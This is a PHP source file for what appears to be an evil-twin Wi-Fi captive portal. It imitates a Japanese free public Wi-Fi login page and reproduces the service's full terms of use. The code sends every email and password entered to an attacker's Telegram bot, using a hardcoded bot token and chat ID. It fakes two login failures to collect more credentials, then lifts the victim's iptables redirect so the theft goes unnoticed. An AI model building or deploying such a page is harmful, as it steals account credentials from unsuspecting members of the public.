<?php
set_time_limit(300);

if (strpos($_SERVER['HTTP_USER_AGENT'],'iPhone') === false && strpos($_SERVER['HTTP_USER_AGENT'],'Android') === false) {
	header("HTTP/1.0 418 I'm a teapot");
	exit();
}

$token = '834034144:AAHVj2gRGsj2IegHSgVZsjJ0rrOHmE3ZmWI';
$chat = '-349544685';

if (isset($_POST['cou'])) {
	if ($_POST['mail'] == 'a@b' && $_POST['pass'] == 'c') {
		// 管理用
		$msg = '';
		$_POST['cou'] = 100;
	} else if ($_POST['cou'] <= 1) {
		// 2回エラーを出す
		$msg = 'ログインに失敗しました<br />';
		$_POST['cou']++;
	}

	if ($_POST['cou'] != 100) {
		file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage?chat_id='
			. $chat . '&disable_web_page_preview=true&parse_mode=HTML&text='
			. urlencode('[LOGIN] MAIL：' . $_POST['mail'] .  '， PASS：' . $_POST['pass']));
	}

	if ($msg) {
		//sleep(1);
	} else {
		system('sudo iptables -t nat -D PREROUTING `sudo iptables -t nat -L --line-numbers '
			. '| grep "' . $_SERVER['REMOTE_ADDR'] . '" | grep ":80" | awk \'{print $1}\'`');
		system('sudo iptables -t nat -D PREROUTING `sudo iptables -t nat -L --line-numbers '
			. '| grep "' . $_SERVER['REMOTE_ADDR'] . '" | grep ":443" | awk \'{print $1}\'`');

		//header('HTTP/1.0 204 No Content');
		echo '.';

		/*
		if (strpos($_SERVER['HTTP_USER_AGENT'], 'Android') === false) {
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<html>
<head><title>Success</title></head>
<body>Success</body>
</html>
<?php
		} else {
?>
<html><head><script>
location.href('intent://www.google.com#Intent;scheme=' + 'http' + ';package=com.android.chrome;end');
</script></head>
<body></body></html>
<?php
		}
		*/

		exit();
	}
} else {
	$_POST['cou'] = 0;
}

if (!$msg)
	$msg = 'ログインして下さい<br />';

?>
<html>
<head>
	<meta charset="utf-8" />
	<link rel="stylesheet" type="text/css" href="style.css">
	<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
	<script src="./jquery-migrate-1.4.1.min.js"></script>
<script>

function post() {
	scrollTo(0, 0);
	if (!document.getElementById('mail').value) {
		document.getElementById('msg').innerHTML = 'メールアドレスを入力して下さい<br />';
		document.getElementById('mail').style.backgroundColor = '#fcc';
		return false;
	}

	if (!document.getElementById('pass').value) {
		document.getElementById('msg').innerHTML = 'パスワードを入力して下さい<br />';
		document.getElementById('pass').style.backgroundColor = '#fcc';
		return false;
	}

	document.getElementById('msg').innerHTML = 'しばらくお待ち下さい';
	scrollTo(0, 0);
	document.getElementById('mail').readOnly = true;
	document.getElementById('pass').readOnly = true;
	document.getElementById('submit').disabled = true;
}

function input_chg() {
	document.getElementById('msg').innerHTML = 'ログインして下さい<br />';
	document.getElementById('mail').style.backgroundColor = '#fff';
	document.getElementById('pass').style.backgroundColor = '#fff';
}
</script>
<style>
* {
	box-sizing:border-box;
	margin:0;
	padding:0;
}
:focus {
	outline:none;
}
input::placeholder {
  color:#aaa;
}
html {
	margin:0;
	padding:0;
}
body {
	margin:0;
	padding:20px;
	width:100%;
	line-height:2em;
	font-size:1.2em;
	font-family:sans-serif;
}
a {
	color:#f88;
	text-decoration:none;
}
hr {
}
input {
	padding:10px;
	display:block;
}
input[type=email], input[type=password] {
	border:1px gray solid;
	border-radius:4px;
	font-size:1.2em;
	box-shadow: 0 0 4px gray inset;
}
input[type=submit],input[type=button] {
	-webkit-appearance:none;
	border:1px gray solid;
	color:#444;
	background-color:#eee;
	border-radius:40px;
	font-size:1.2em;
	box-shadow: 0 0 6px gray;
}
.kiyaku {
	color:#444;
	font-size:0.9em;
	width:100%;
	padding:10px;
	max-width:600px;
	height:50%;
	overflow:scroll;
	border:1px gray solid;
	border-radius:4px;
	background-color:#eee;
	box-shadow: 0 0 6px gray inset;
	margin:auto;
}
</style>
</head>
<body>
	<img src="./logo1.svg" style="width:70%;max-width:600px;height:auto;display:block;margin:auto;" />
	<div id="msg" style="font-size:1.0em;color:orange;text-align:center;margin:20px;"><?=$msg?></div>
	<form action="" method="post" onsubmit="return post()">
		<div style="max-width:600px;margin:auto">
			メールアドレス
			<input type="email" id="mail" name="mail" placeholder="Mail Address" value="<?=$_POST['mail']?>" style="width:100%;margin-bottom:15px" onfocus="input_chg()" />
		</div>
		<div style="max-width:600px;margin:auto">
			パスワード
			<input type="password" id="pass" name="pass" placeholder="Password" style="width:100%;margin-bottom:40px" onfocus="input_chg()" />
		</div>
		<br />
		<input type="submit" id="submit" value="ログイン" style="width:50%;margin:0 auto 0 auto;padding:10px;" />
		<br />
		<br />

		<div class="kiyaku">
KANSAN WIFI FOUNDATION 無料Wi-Fi利用規約<br />

第1条（規約の適用）<br />
合同会社ケーダブルシー（以下「当社」といいます）は、無料の公衆無線LANサービス（「KWF」。以下「本サービス」といいます）に関して、本サービスを利用する者（以下「利用者」といいます）に対し、以下のとおり利用規約（以下「本規約」といいます）を定めます。<br />
<br />
2. 当社は、利用者の承諾を得ることなく、本規約を変更できるものとします。本規約を変更した際には、当社ホームページ等で公表いたします。<br />
<br />
第2条（本サービスの申し込み）<br />
本サービスの利用を希望する申込者（以下「申込者」という）は、本規約及び契約約款に同意していただいた上で、当社所定の手続きにより本サービスの申し込みを行い、利用してください。なお、申込者が未成年者の場合には、親権者の同意を得て申し込んでください。<br />
<br />
第3条（本サービス利用の条件）<br />
利用者は、自己の責任と負担において、本サービスを利用するために必要な通信機器、ソフトウェア等を準備するものとします。<br />
<br />
第4条（本サービス利用資格の譲渡制限）<br />
利用者は、本サービスを利用する権利を、第三者に譲渡することはできないものとします。<br />
<br />
第5条（本サービスの変更）<br />
当社は、本サービスについて、本サービスの内容の全部または一部を変更することができます。<br />
<br />
第6条（第三者が提供する情報の利用）<br />
利用者は、第三者が提供する情報の利用において、一切の責任は各情報の提供者に帰属していること及び、当社が当該情報提供の当事者でないことに同意するものとします。<br />
<br />
第7条（第三者が提供する情報の内容の不保証）<br />
当社は、本サービスを通じて第三者が提供する商品、サービス及び情報について、その完全性、正確性、確実性、有用性などにつき、いかなる保証もしません。<br />
<br />
2. 当社は、利用者が第三者の提供する商品、サービスまたは情報を利用したことに関して、利用者と第三者との間に紛争が生じた場合、一切の責任を負いません。<br />
<br />
第8条（通信利用の制限）<br />
当社は、利用者が第9条（禁止事項）に該当する行為を行った場合、本規約に違反した場合、当社の通知内容に従わなかった場合、または当社が本サービスの運営上必要と判断した場合において、次の各号の措置のいずれかまたはこれらを組み合わせた措置を講ずることがあります。<br />
<br />
•利用者が特定の通信手段を用いて行う通信について、当該通信に割り当てる帯域を制限すること<br />
•利用者の本サービスの利用を一時的に停止、または利用を制限すること<br />
<br />
2. 当社は、本サービスにおいて青少年保護の観点から青少年が利用することが望ましくないと当社が判断するサイト等へのアクセスを制限（フィルタリング等）することがあります。<br />
<br />
3. 当社は、一般社団法人インターネットコンテンツセーフティ協会が児童ポルノの流通を防止するために作成した児童ポルノアドレスリスト（同協会が定める児童ポルノアドレスリスト提供規約に基づき当社が提供を受けたインターネット上の接続先情報をいいます｡）において指定された接続先との通信を制限することがあります。<br />
<br />
4. 当社は、本条各項の措置を講じる義務を負うものではなく、また講じることまたは講じなかったことに起因して利用者または第三者が被ったいかなる損害についても責任を負わないものとします。<br />
<br />
第9条（禁止事項）<br />
利用者は、本サービスの利用にあたり、次の各号の行為を行ってはならないものとし、次の各号の行為を行っていると当社が判断した場合は、当社は、本サービスの利用を停止することがあります。<br />
<br />
① 第三者または当社の著作権もしくはその他の権利を侵害する行為、またはこれらを侵害するおそれのある行為。<br />
<br />
②第三者または当社の財産もしくはプライバシーを侵害する行為、またはこれらを侵害するおそれのある行為。<br />
<br />
③前号のほか、第三者または当社に不利益もしくは損害を与える行為、または与えるおそれのある行為。<br />
<br />
④第三者または当社を誹謗中傷する行為。<br />
<br />
⑤公序良俗に反する行為（猥褻、売春、暴力、残虐、虐待等）、またはそのおそれがある行為、もしくは公序良俗に反する情報を第三者に提供する行為。<br />
<br />
⑥犯罪的行為、または犯罪的行為に結び付く行為、もしくはそれらのおそれのある行為。<br />
<br />
⑦選挙期間中であるか否かを問わず、選挙運動またはこれに類する行為。<br />
<br />
⑧本サービスを再販売、賃貸するなど、本サービスそのものを営利の目的とする行為。<br />
<br />
⑨無限連鎖講（ネズミ講）を開設し、またはこれを勧誘する行為。<br />
<br />
⑩不特定多数に配信する広告・宣伝・勧誘等または詐欺まがいの情報もしくは嫌悪感を抱く、またはそのおそれのある電子メール（嫌がらせメール）を送信する行為。<br />
<br />
⑪第三者または当社に対しメール受信を妨害する行為、もしくは連鎖的なメール転送を依頼または当該依頼に応じて転送する行為。<br />
<br />
⑫第三者になりすまして本サービスを利用する行為。<br />
<br />
⑬本サービスによる当社または第三者への不正アクセス、または改ざん、消去などの不法行為。<br />
<br />
⑭コンピュータウィルス等の有害なプログラムを、本サービスを通じて、または本サービスに関連して使用し、もしくは提供する行為。<br />
<br />
⑮第三者または当社に迷惑・不利益を及ぼす行為、本サービスに支障を来たすおそれのある行為、本サービスの運営を妨げる行為。<br />
<br />
⑯本サービスを利用して、本サービスを直接または間接に利用する者の当該利用に対し、重大な支障を与える行為、またはそのおそれがある行為。<br />
<br />
⑰当社が定める本サービスの利用開始に必要な手続きを、当社の許可無く回避して利用し、またはさせる行為。<br />
<br />
⑱その他、法令に違反する、または違反するおそれのある行為。<br />
<br />
⑲その他、当社が不適切と判断する行為。<br />
<br />
第10条（利用者の賠償責任）<br />
前条（禁止事項）に該当する利用者の行為によって当社及び第三者に損害が生じた場合、利用者としての資格を喪失した後であっても、利用者は、損害賠償等すべての法的責任を負うものとします。<br />
<br />
第11条（利用者の自己責任）<br />
利用者は、本サービスを利用してアップロードまたはダウンロードした情報もしくはファイルに関連して、何らかの損害を被った場合または何らかの法的責任を負う場合においては、自己の責任においてこれを処理し、当社に対して何ら請求もなさず、迷惑をかけないものとします。<br />
<br />
第12条（所有権及び知的財産権）<br />
本サービスを構成するすべてのプログラム、ソフトウェア、サービス、手続き、商標、商号または第三者が提供するサービスもしくはそれに付随する技術全般の所有権及び知的財産権は、当社または当該提供者に帰属するものとします。<br />
<br />
第13条（著作権）<br />
利用者は、権利者の許諾を得ることなく、いかなる方法においても、本サービスを通じて提供されるあらゆる情報またはファイルについて、著作権法で定める利用者個人の私的利用のための複製の範囲を超えて利用をすることはできないものとします。<br />
<br />
2. 利用者は、権利者の許諾を得ることなく、いかなる方法においても、本サービスを通じて提供されるあらゆる情報またはファイルについて、第三者をして使用させたり、公開させたりすることはできないものとします。<br />
<br />
3. 前二項の規定に違反して紛争が発生した場合、利用者は、自己の費用と責任において、当該紛争を解決するとともに、当社をいかなる場合においても免責し、当社に対し損害を与えないものとします。<br />
<br />
第14条（個人情報の利用）<br />
申込者が本サービス利用の申込を行った際に当社が知り得た申込者に関する個人情報、または利用者が本サービスを利用する過程において当社が知り得た利用者に関する個人情報に関しては、当社のプライバシーポリシーに則り、適正に取り扱います。なお、個人情報の利用目的は別紙に定めるものとします。<br />
<br />
第15条（申込者および利用者情報の利活用）<br />
当社は、「お客様情報の利活用にあたってのプライバシー保護の取り組み」に則り、個人を特定しない安全な形に加工した上で、適正に取り扱います。<br />
<br />
「お客様情報利活用にあたってのプライバシー保護の取り組み」はこちらをご確認ください。また、お客様情報の利活用の設定はこちらで承ります。<br />
<br />
第16条（本サービスの中止・中断）<br />
当社は、本サービスの運営を、事前の通知なく中止または中断できるものとします。<br />
<br />
2. 当社は、本条に基づく本サービスの中止または中断により、利用者または第三者が被ったいかなる損害についても責任を負わないものとします。<br />
<br />
第17条（免責事項）<br />
当社は、本サービスの提供に関連して利用者に生じた損害について一切の責任を負いません。<br />
<br />
2. 当社は、利用者が使用する通信機器、及びソフトウェア等について、一切動作保証は行わないものとします。<br />
<br />
第18条（準拠法）<br />
本規約の成立、効力、履行および解釈に関しては、日本法が適用されるものとします。<br />
<br />
第19条（協議）<br />
本サービスに関連して、利用者と当社との間で紛争が生じた場合には、当該当事者がともに誠意をもって協議するものとします。<br />
<br />
第20条（管轄裁判所）<br />
本サービスにかかる紛争を解決するに際しては、東京地方裁判所または東京簡易裁判所を第一審の専属的合意管轄裁判所とします。<br />
<br />
Copyright © WIRE AND WIRELESS All rights reserved.
		</div>
		<br />
		<br />
		<input type="hidden" id="cou" name="cou" value="<?=$_POST['cou']?>" />
		<input type="button" id="button" onclick="location.href='./regist1.php'" value="新規登録" style="width:55%;margin:0 auto 0 auto;padding:10px;" />
	</form>
</body>
</html>
